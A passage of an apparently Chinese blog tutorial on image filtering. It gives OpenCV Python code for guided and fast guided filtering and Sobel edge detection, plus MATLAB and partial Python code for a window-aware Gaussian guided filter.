class="params">()</span>:</span></span><br><span class="line">    img = cv2.imread(input_fn)<span class="comment">#读入图像</span></span><br><span class="line">    print( np.shape(img) )</span><br><span class="line"></span><br><span class="line">    dstimg = my_guidedFilter_threeChannel(img, img, <span class="number">9</span> , <span class="number">0.01</span>)<span class="comment">#输入图像作为自身的引导图</span></span><br><span class="line">    print( np.shape(dstimg) )</span><br><span class="line">    <span class="comment"># cv2.imwrite('output.jpg',dstimg)</span></span><br><span class="line">    cv2.imshow(<span class="string">'output'</span>, dstimg)</span><br><span class="line">    cv2.waitKey(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">@First_author: Jin ZhangYu</span></span><br><span class="line"><span class="string">@Second_author: Dragon Liu</span></span><br><span class="line"><span class="string">Operating environment: Python 3.7.1</span></span><br><span class="line"><span class="string">lib:  opencv-contrib-python</span></span><br><span class="line"><span class="string">Date: 2020/3/16</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment"># 导入库</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> skimage</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造参数解析器</span></span><br><span class="line"><span class="comment"># ap = argparse.ArgumentParser()</span></span><br><span class="line"><span class="comment"># ap.add_argument("-H:\project_work\Machine_Vision_Lab\thesis\Gaussian\code", "--02.png", required=True, help = "Path to the image")</span></span><br><span class="line"><span class="comment"># args = vars(ap.parse_args())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载图像并显示</span></span><br><span class="line">input_fn = <span class="string">'02.png'</span></span><br><span class="line"><span class="comment"># img = cv2.imread(args["image"],1)</span></span><br><span class="line">img = cv2.imread(input_fn)</span><br><span class="line">img = img[:,:,::<span class="number">-1</span>]</span><br><span class="line">guide = cv2.cvtColor(img, cv2.COLOR_RGB2GRAY)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行导向滤波</span></span><br><span class="line">dst1 = cv2.ximgproc.guidedFilter(</span><br><span class="line">            guide=guide, src=img, radius=<span class="number">16</span>, eps=<span class="number">50</span>, dDepth=<span class="number">-1</span>)</span><br><span class="line">dst2 = cv2.ximgproc.guidedFilter(</span><br><span class="line">            guide=guide, src=img, radius=<span class="number">16</span>, eps=<span class="number">200</span>, dDepth=<span class="number">-1</span>)</span><br><span class="line">dst3 = cv2.ximgproc.guidedFilter(</span><br><span class="line">            guide=guide, src=img, radius=<span class="number">16</span>, eps=<span class="number">1000</span>, dDepth=<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制图片</span></span><br><span class="line">images = [img,[dst1,dst2,dst3]]</span><br><span class="line">titles =    [</span><br><span class="line">                <span class="string">'Original'</span>,</span><br><span class="line">                [<span class="string">'Guided Filter eps=50'</span>,<span class="string">'Guided Filter eps=200'</span>,<span class="string">'Guided Filter eps=1000'</span>]</span><br><span class="line">            ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制原图</span></span><br><span class="line">plt.figure(figsize=(<span class="number">9</span>,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">plt.subplot(<span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>),plt.imshow(images[<span class="number">0</span>])</span><br><span class="line">plt.title(titles[<span class="number">0</span>], fontsize=<span class="number">10</span>),plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">plt.subplot(<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>),plt.imshow(images[<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line">plt.title(titles[<span class="number">1</span>][<span class="number">0</span>], fontsize=<span class="number">10</span>),plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">plt.subplot(<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>),plt.imshow(images[<span class="number">1</span>][<span class="number">1</span>])</span><br><span class="line">plt.title(titles[<span class="number">1</span>][<span class="number">1</span>], fontsize=<span class="number">10</span>),plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">plt.subplot(<span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>),plt.imshow(images[<span class="number">1</span>][<span class="number">2</span>])</span><br><span class="line">plt.title(titles[<span class="number">1</span>][<span class="number">2</span>], fontsize=<span class="number">10</span>),plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line"><span class="comment"># plt.savefig('1_out.png', transparent=True, dpi=300, pad_inches = 0)</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h4 id="4-代码2快速导向滤波"><a class="markdownIt-Anchor" href="#4-代码2快速导向滤波"></a> 4. 代码2(快速导向滤波)</h4><p>通过下采样减少像素点，计算mean_a &amp; mean_b后进行上采样恢复到原有的尺寸大小。假设缩放比例为s,那么缩小后像素点的个数为 $$\frac {N}{s^2}$$ ，那么时间复杂度变为 $$O(\frac {N}{s^2})$$​ 。伪代码中：fmean代表均值平滑，fsubsample代表图像下采样即缩小图像，fupsample代表图片上采样即放大图像，s为缩小系数。参考：<a href="https://blog.csdn.net/wsp_1138886114/article/details/84228939?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">我跳</a></p><img src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/FGF.png" width="400" height="400" alt="图片名称" align="center" id="24"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">@First_author: SongpingWangSongpingWangs</span></span><br><span class="line"><span class="string">@Second_author: Dragon Liu</span></span><br><span class="line"><span class="string">Operating environment: Python 3.7.1</span></span><br><span class="line"><span class="string">lib:  opencv-python</span></span><br><span class="line"><span class="string">Date: 2020/3/16</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guideFilter</span><span class="params">(I, p, winSize, eps, s)</span>:</span></span><br><span class="line">    <span class="comment"># 输入图像的高、宽</span></span><br><span class="line">    h, w = I.shape[:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 缩小图像</span></span><br><span class="line">    size = (int(round(w * s)), int(round(h * s)))</span><br><span class="line">    small_I = cv2.resize(I, size, interpolation=cv2.INTER_CUBIC)</span><br><span class="line">    small_p = cv2.resize(I, size, interpolation=cv2.INTER_CUBIC)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 缩小滑动窗口</span></span><br><span class="line">    X = winSize[<span class="number">0</span>]</span><br><span class="line">    small_winSize = (int(round(X * s)), int(round(X * s)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># I的均值平滑 p的均值平滑</span></span><br><span class="line">    mean_small_I = cv2.blur(small_I, small_winSize)</span><br><span class="line">    mean_small_p = cv2.blur(small_p, small_winSize)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># I*I和I*p的均值平滑</span></span><br><span class="line">    mean_small_II = cv2.blur(small_I * small_I, small_winSize)</span><br><span class="line">    mean_small_Ip = cv2.blur(small_I * small_p, small_winSize)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 方差、协方差</span></span><br><span class="line">    var_small_I = mean_small_II - mean_small_I * mean_small_I</span><br><span class="line">    cov_small_Ip = mean_small_Ip - mean_small_I * mean_small_p</span><br><span class="line"></span><br><span class="line">    small_a = cov_small_Ip / (var_small_I + eps)</span><br><span class="line">    small_b = mean_small_p - small_a * mean_small_I</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对a、b进行均值平滑</span></span><br><span class="line">    mean_small_a = cv2.blur(small_a, small_winSize)</span><br><span class="line">    mean_small_b = cv2.blur(small_b, small_winSize)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 放大</span></span><br><span class="line">    size1 = (w, h)</span><br><span class="line">    mean_a = cv2.resize(mean_small_a, size1, interpolation=cv2.INTER_LINEAR)</span><br><span class="line">    mean_b = cv2.resize(mean_small_b, size1, interpolation=cv2.INTER_LINEAR)</span><br><span class="line"></span><br><span class="line">    q = mean_a * I + mean_b</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> q</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    eps = <span class="number">0.01</span></span><br><span class="line">    winSize = (<span class="number">16</span>,<span class="number">16</span>)       <span class="comment">#类似卷积核（数字越大，磨皮效果越好）</span></span><br><span class="line">    image = cv2.imread(<span class="string">r'02.png'</span>, cv2.IMREAD_ANYCOLOR)</span><br><span class="line">    image = cv2.resize(image,<span class="literal">None</span>,fx=<span class="number">0.8</span>,fy=<span class="number">0.8</span>,interpolation=cv2.INTER_CUBIC)</span><br><span class="line">    I = image/<span class="number">255.0</span>       <span class="comment">#将图像归一化</span></span><br><span class="line">    p =I</span><br><span class="line">    s = <span class="number">3</span> <span class="comment">#步长</span></span><br><span class="line">    guideFilter_img = guideFilter(I, p, winSize, eps,s)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 保存导向滤波结果</span></span><br><span class="line">    guideFilter_img = guideFilter_img  * <span class="number">255</span>         <span class="comment">#(0,1)-&gt;(0,255)</span></span><br><span class="line">    guideFilter_img[guideFilter_img  &gt; <span class="number">255</span>] = <span class="number">255</span>    <span class="comment">#防止像素溢出</span></span><br><span class="line">    guideFilter_img = np.round(guideFilter_img )</span><br><span class="line">    guideFilter_img = guideFilter_img.astype(np.uint8)</span><br><span class="line">    cv2.imshow(<span class="string">"image"</span>,image)</span><br><span class="line">    cv2.imshow(<span class="string">"winSize_16"</span>, guideFilter_img )</span><br><span class="line">    cv2.waitKey(<span class="number">0</span>)</span><br><span class="line">    cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure><h3 id="0x07-高通滤波-边缘检测高反差保留"><a class="markdownIt-Anchor" href="#0x07-高通滤波-边缘检测高反差保留"></a> 0x07 高通滤波 – 边缘检测/高反差保留</h3><ol><li><strong>定义</strong>：</li><li><strong>代码</strong>：使用的函数有：<code>cv2.Sobel()</code> , <code>cv2.Schar()</code> , <code>cv2.Laplacian()</code> Sobel, scharr其实是求一阶或者二阶导数。scharr是对Sobel的优化。 Laplacian是求二阶导数。cv2.Sobel() 是一种带有方向过滤器。参考：<a href="https://blog.csdn.net/wsp_1138886114/article/details/82872838?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">我跳</a></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">@First_author: SongpingWang</span></span><br><span class="line"><span class="string">@Second_author: Dragon Liu</span></span><br><span class="line"><span class="string">Operating environment: Python 3.7.1</span></span><br><span class="line"><span class="string">lib:  opencv-python</span></span><br><span class="line"><span class="string">Date: 2020/3/16</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">dst = cv2.Sobel(src, ddepth, dx, dy[, dst[, ksize[, scale[, delta[, borderType]]]]])</span></span><br><span class="line"><span class="string">src:    需要处理的图像；</span></span><br><span class="line"><span class="string">ddepth: 图像的深度，-1表示采用的是与原图像相同的深度。 </span></span><br><span class="line"><span class="string">        目标图像的深度必须大于等于原图像的深度；</span></span><br><span class="line"><span class="string">dx和dy: 求导的阶数，0表示这个方向上没有求导，一般为0、1、2。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">dst     不用解释了；</span></span><br><span class="line"><span class="string">ksize： Sobel算子的大小，必须为1、3、5、7。  ksize=-1时，会用3x3的Scharr滤波器，</span></span><br><span class="line"><span class="string">        它的效果要比3x3的Sobel滤波器要好 </span></span><br><span class="line"><span class="string">scale： 是缩放导数的比例常数，默认没有伸缩系数；</span></span><br><span class="line"><span class="string">delta： 是一个可选的增量，将会加到最终的dst中， 默认情况下没有额外的值加到dst中</span></span><br><span class="line"><span class="string">borderType： 是判断图像边界的模式。这个参数默认值为cv2.BORDER_DEFAULT。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line">img=cv2.imread(<span class="string">'02.png'</span>,cv2.IMREAD_COLOR)</span><br><span class="line">x=cv2.Sobel(img,cv2.CV_16S,<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">y=cv2.Sobel(img,cv2.CV_16S,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">absx=cv2.convertScaleAbs(x)</span><br><span class="line">absy=cv2.convertScaleAbs(y)</span><br><span class="line">dist=cv2.addWeighted(absx,<span class="number">0.5</span>,absy,<span class="number">0.5</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">cv2.imshow(<span class="string">'original_img'</span>,img)</span><br><span class="line">cv2.imshow(<span class="string">'y'</span>,absy)</span><br><span class="line">cv2.imshow(<span class="string">'x'</span>,absx)</span><br><span class="line">cv2.imshow(<span class="string">'dsit'</span>,dist)</span><br><span class="line"></span><br><span class="line">cv2.waitKey(<span class="number">0</span>)</span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure><h3 id="0x08-窗口感知的高斯引导滤波"><a class="markdownIt-Anchor" href="#0x08-窗口感知的高斯引导滤波"></a> 0x08 窗口感知的高斯引导滤波</h3><ul><li><strong>gr.m</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function result = gr(px, py, qx, qy, dr)</span><br><span class="line">% 高斯空间核函数</span><br><span class="line">    result = exp( - ( (qx - px)^<span class="number">2</span> + (qy - py)^<span class="number">2</span> ) / (<span class="number">2</span> * dr^<span class="number">2</span>) );</span><br><span class="line">end</span><br></pre></td></tr></table></figure><ul><li><strong>gzeta.m</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function result = gzeta(guide_img, div, px, py, qx, qy, dzeta)</span><br><span class="line">% 高斯频域核函数</span><br><span class="line">    result = exp( - ( ( guide_img(px, py, div) - guide_img(qx, qy, div) )^<span class="number">2</span> )  / (<span class="number">2</span> * dzeta^<span class="number">2</span>) );</span><br><span class="line">end</span><br></pre></td></tr></table></figure><ul><li><strong>GS.m</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function output = GS(image, r, dr, px, py, div)</span><br><span class="line">% 求解高斯空间域滤波，返回指定像素点(p)的输出</span><br><span class="line">    Upsilon = <span class="number">0</span>;%τ，归一化系数</span><br><span class="line">    output = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i = -r : r % 以p为中心的窗口半径为<span class="number">2</span>r+<span class="number">1</span>的区域</span><br><span class="line">        <span class="keyword">for</span> j = -r : r</span><br><span class="line">            Upsilon = Upsilon + gr(px, py, px + i, py + j, dr);</span><br><span class="line">            output = output + gr(px, py, px + i, py + j, dr) * image(px + i,py + j,div);</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line">    output = output / Upsilon ;</span><br><span class="line">end</span><br></pre></td></tr></table></figure><ul><li><strong>WGGF.m</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function output = WGGF(guide_img, source, r, dzeta, px, py, div, <span class="keyword">lambda</span>)</span><br><span class="line">% 窗口感知的高斯引导滤波</span><br><span class="line">%求解WGGF在每个像素点p的输出并返回</span><br><span class="line">    Upsilon = <span class="number">0</span>;%τ，归一化系数</span><br><span class="line">    output = <span class="number">0</span>;</span><br><span class="line">    flag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i = -r : r</span><br><span class="line">        <span class="keyword">for</span> j = -r : r</span><br><span class="line">            temp = abs( guide_img(px + i, py + <span class="number">1</span>, div) - guide_img(px, py, div) );</span><br><span class="line">            <span class="keyword">if</span> temp &lt;= <span class="keyword">lambda</span> </span><br><span class="line">                flag = flag + <span class="number">1</span>;</span><br><span class="line">                Upsilon = Upsilon + gzeta(guide_img, div, px, py, px+i, py+j, dzeta);</span><br><span class="line">                output = output + guide_img(px + i,py + j,div) * gzeta(guide_img, div, px, py, px+i, py+j, dzeta);</span><br><span class="line">            end</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span> %不满足窗口感知的要求，返回<span class="number">3</span>*<span class="number">3</span>窗口中的像素点中值</span><br><span class="line">        output = medfilt2( source( (px - <span class="number">1</span>):(px + <span class="number">1</span>), (py - <span class="number">1</span>):(py + <span class="number">1</span>), j), [<span class="number">3</span>,<span class="number">3</span>] );</span><br><span class="line">    <span class="keyword">else</span> %满足条件</span><br><span class="line">        output = output / Upsilon ;</span><br><span class="line">    end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><ul><li><strong>Main.m</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">%% 读取图片</span><br><span class="line">source = im2double( imread(<span class="string">'01.jpg'</span>) );</span><br><span class="line">guide_img = source;</span><br><span class="line"></span><br><span class="line">%% 求解高斯引导滤波</span><br><span class="line">[m ,n, div] = size(source);</span><br><span class="line">r = <span class="number">5</span>; %窗口半径</span><br><span class="line">dr = <span class="number">0.5</span>; %空域带宽</span><br><span class="line"><span class="keyword">for</span> k = <span class="number">1</span> : div</span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">1</span> : m</span><br><span class="line">        <span class="keyword">for</span> j = <span class="number">1</span> : n</span><br><span class="line">            <span class="keyword">if</span> i &lt;= r || i &gt;= m - r || j &lt;= r || j &gt;= n - r %图片四周处理(原像素)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                guide_img(i,j,k) = GS(source, r, dr, i, j, k); %空间域滤波</span><br><span class="line">            end</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">%% 求解WGGF</span><br><span class="line">target = guide_img;</span><br><span class="line">r = <span class="number">5</span>; %窗口半径</span><br><span class="line">dzeta = <span class="number">0.1</span>; %频域带宽</span><br><span class="line"><span class="keyword">lambda</span> = <span class="number">0.12</span>; % λ为一选定的阈值 </span><br><span class="line"><span class="keyword">for</span> k = <span class="number">1</span> : div</span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">1</span> : m</span><br><span class="line">        <span class="keyword">for</span> j = <span class="number">1</span> : n</span><br><span class="line">            <span class="keyword">if</span> i &lt;= r || i &gt;= m - r || j &lt;= r || j &gt;= n - r%图片四周处理(引导像素)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                target(i, j, k) = WGGF(guide_img, source, r, dzeta, i, j, k, <span class="keyword">lambda</span>); </span><br><span class="line">            end</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">%% 显示图形</span><br><span class="line">figure;</span><br><span class="line">subplot(<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>), imshow(source), title(<span class="string">'Source image'</span>);</span><br><span class="line">subplot(<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>), imshow(target), title(<span class="string">'WGGF image'</span>);</span><br></pre></td></tr></table></figure><ul><li><strong><a href="http://WGGF.py" target="_blank" rel="noopener">WGGF.py</a>(Bug)</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">@author: Dragon Liu</span></span><br><span class="line"><span class="string">Operating environment: Python 3.7.1</span></span><br><span class="line"><span class="string">lib:  opencv-python</span></span><br><span class="line"><span class="string">Date: 2020/3/22</span></span><br><span class="line"><span class="string">BUG: 时间复杂度O(m*n*div*r*r)，不可行，另外存在img[]访问问题</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment">#导入库</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> cv2  </span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np  </span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 高斯空间核函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gr</span><span class="params">(px, py, qx, qy, dr)</span>:</span></span><br><span class="line"></span><br><span 